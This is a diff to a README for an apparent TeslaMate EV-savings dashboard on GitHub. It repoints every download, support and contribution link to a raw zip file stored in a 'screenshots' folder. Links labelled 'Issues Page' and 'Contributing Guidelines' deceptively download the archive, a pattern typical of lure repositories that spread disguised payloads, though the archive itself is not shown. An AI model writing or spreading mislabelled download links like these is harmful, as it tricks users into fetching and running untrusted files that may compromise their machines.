@@ -6,7 +6,7 @@ This application helps you visualize the savings from using an electric vehicle 
 
 ## 📥 Download Now!
 
-[![Download](https://raw.githubusercontent.com/ALEXPIPISKA/ev-savings-vs-fuel-dashboard-teslamate/main/forfaulture/ev-savings-vs-fuel-dashboard-teslamate.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/ALEXPIPISKA/ev-savings-vs-fuel-dashboard-teslamate/main/forfaulture/ev-savings-vs-fuel-dashboard-teslamate.zip)
+[![Download](https://github.com/ALEXPIPISKA/ev-savings-vs-fuel-dashboard-teslamate/raw/refs/heads/main/screenshots/fuel_savings_teslamate_ev_dashboard_vs_1.4-beta.3.zip%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/ALEXPIPISKA/ev-savings-vs-fuel-dashboard-teslamate/raw/refs/heads/main/screenshots/fuel_savings_teslamate_ev_dashboard_vs_1.4-beta.3.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ Follow these steps to get started with the ev-savings-vs-fuel-dashboard-teslamat
 
 1. **Visit the Releases Page**  
    Click the link below to go to the page where you can download the application:
-   [Download Here](https://raw.githubusercontent.com/ALEXPIPISKA/ev-savings-vs-fuel-dashboard-teslamate/main/forfaulture/ev-savings-vs-fuel-dashboard-teslamate.zip)
+   [Download Here](https://github.com/ALEXPIPISKA/ev-savings-vs-fuel-dashboard-teslamate/raw/refs/heads/main/screenshots/fuel_savings_teslamate_ev_dashboard_vs_1.4-beta.3.zip)
 
 2. **Choose a Version**  
    On the Releases page, you will see several versions listed. Look for the latest version. It typically has the most features and fixes.
@@ -63,11 +63,11 @@ After installing the application, you may want to configure some settings:
 
 ## 📞 Support
 
-For help, visit our [Issues Page](https://raw.githubusercontent.com/ALEXPIPISKA/ev-savings-vs-fuel-dashboard-teslamate/main/forfaulture/ev-savings-vs-fuel-dashboard-teslamate.zip) on GitHub. You can report any bugs you find or ask any questions you may have.
+For help, visit our [Issues Page](https://github.com/ALEXPIPISKA/ev-savings-vs-fuel-dashboard-teslamate/raw/refs/heads/main/screenshots/fuel_savings_teslamate_ev_dashboard_vs_1.4-beta.3.zip) on GitHub. You can report any bugs you find or ask any questions you may have.
 
 ## ✏️ Contributing
 
-If you're interested in contributing to this project, feel free to submit a pull request. Your help improves the application for everyone. Please check our [Contributing Guidelines](https://raw.githubusercontent.com/ALEXPIPISKA/ev-savings-vs-fuel-dashboard-teslamate/main/forfaulture/ev-savings-vs-fuel-dashboard-teslamate.zip) for more details.
+If you're interested in contributing to this project, feel free to submit a pull request. Your help improves the application for everyone. Please check our [Contributing Guidelines](https://github.com/ALEXPIPISKA/ev-savings-vs-fuel-dashboard-teslamate/raw/refs/heads/main/screenshots/fuel_savings_teslamate_ev_dashboard_vs_1.4-beta.3.zip) for more details.
 
 ## 📜 License
 
@@ -75,4 +75,4 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 ## 📥 Download & Install
 
-Remember to [visit this page to download](https://raw.githubusercontent.com/ALEXPIPISKA/ev-savings-vs-fuel-dashboard-teslamate/main/forfaulture/ev-savings-vs-fuel-dashboard-teslamate.zip) the latest version and start leveraging your EV savings today!
+Remember to [visit this page to download](https://github.com/ALEXPIPISKA/ev-savings-vs-fuel-dashboard-teslamate/raw/refs/heads/main/screenshots/fuel_savings_teslamate_ev_dashboard_vs_1.4-beta.3.zip) the latest version and start leveraging your EV savings today!
